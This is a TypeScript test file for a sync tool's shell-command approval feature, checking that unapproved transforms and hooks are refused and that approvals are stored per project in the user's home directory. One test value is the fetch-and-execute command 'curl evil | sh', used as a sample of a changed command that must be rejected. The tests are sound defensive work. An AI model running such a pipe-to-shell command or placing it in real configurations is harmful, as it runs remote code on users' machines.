import { describe, it, beforeEach, afterEach } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import { withTempHome } from '../../../test-support/home.js';
import {
  approveShellCommands, assertShellApproved, isShellApproved, shellCommandsOf, SyncShellNotApprovedError,
} from './approval.js';
import { syncModel } from './runner.js';
import type { SyncProfile } from './types.js';
import type { OneApi } from '../../api.js';

const home = withTempHome();
let origCwd: string;
let project: string;

beforeEach(() => {
  home.setup();
  origCwd = process.cwd();
  project = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'one-sync-approval-')));
  process.chdir(project);
});

afterEach(() => {
  process.chdir(origCwd);
  fs.rmSync(project, { recursive: true, force: true, maxRetries: 10, retryDelay: 50 });
  home.teardown();
});

const base: SyncProfile = {
  platform: 'gmail',
  model: 'threads',
  connectionKey: 'live::gmail::default::x',
  actionId: 'conn_mod_def::x',
  resultsPath: 'items',
  idField: 'id',
  pagination: { type: 'none' },
};

describe('sync shell command approval', () => {
  it('collects transform and hooks, but not the built-in log hook', () => {
    assert.deepEqual(
      shellCommandsOf({ ...base, transform: 'jq .', onInsert: 'log', onUpdate: './notify.sh', onChange: '' }),
      { transform: 'jq .', onUpdate: './notify.sh' },
    );
  });

  it('treats a profile without shell commands as approved', () => {
    assert.ok(isShellApproved({ ...base, onChange: 'log' }));
    assert.doesNotThrow(() => assertShellApproved(base));
  });

  it('refuses unapproved commands, accepts approved ones, and refuses them again once changed', () => {
    const profile = { ...base, transform: 'jq .' };
    assert.throws(() => assertShellApproved(profile), SyncShellNotApprovedError);
    approveShellCommands(profile);
    assert.doesNotThrow(() => assertShellApproved(profile));
    assert.throws(() => assertShellApproved({ ...profile, transform: 'curl evil | sh' }), /sync approve gmail --models threads/);
    assert.throws(() => assertShellApproved({ ...profile, onInsert: 'touch x' }), SyncShellNotApprovedError);
  });

  it('keeps approvals per project directory', () => {
    const profile = { ...base, onChange: './hook.sh' };
    approveShellCommands(profile);
    const other = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'one-sync-approval-other-')));
    try {
      process.chdir(other);
      assert.ok(!isShellApproved(profile));
    } finally {
      process.chdir(project);
      fs.rmSync(other, { recursive: true, force: true });
    }
    assert.ok(isShellApproved(profile));
  });

  it('stores approvals in the user home, not the project', () => {
    approveShellCommands({ ...base, transform: 'jq .' });
    assert.ok(fs.existsSync(path.join(home.oneDir, 'sync', 'shell-approvals.json')));
    assert.ok(!fs.existsSync(path.join(project, '.one')));
  });

  it('syncModel stops before running an unapproved transform or hook', async () => {
    const marker = path.join(project, 'pwned');
    const profile = { ...base, transform: `touch ${JSON.stringify(marker)}`, onInsert: `touch ${JSON.stringify(marker)}` };
    const api = {} as OneApi; // never reached: the check runs before any API call
    await assert.rejects(() => syncModel(api, profile, {}), SyncShellNotApprovedError);
    assert.ok(!fs.existsSync(marker));
    assert.ok(!fs.existsSync(path.join(project, '.one', 'sync', 'locks')), 'no lock taken');
  });
});
